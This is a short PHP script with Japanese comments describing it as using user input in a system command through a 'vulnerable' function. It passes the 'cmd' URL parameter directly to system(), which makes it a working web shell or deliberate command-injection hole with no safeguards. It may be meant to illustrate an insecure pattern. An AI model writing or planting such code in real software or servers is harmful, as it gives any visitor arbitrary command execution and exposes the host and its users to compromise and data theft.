<?php
// ユーザー入力を受け取り、それをシステムコマンドに使用する
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // 脆弱なexec関数を使用
    system($cmd);
}
?>